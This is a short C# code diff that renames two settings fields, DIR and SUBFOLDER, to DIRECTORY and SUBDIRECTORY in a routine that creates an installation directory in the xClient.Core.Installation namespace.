@@ -16,11 +16,11 @@ namespace xClient.Core.Installation
             bool isKilled = false;
 
             // create target dir
-            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
+            if (!Directory.Exists(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY)))
             {
                 try
                 {
-                    Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
+                    Directory.CreateDirectory(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY));
                 }
                 catch (Exception)
                 {
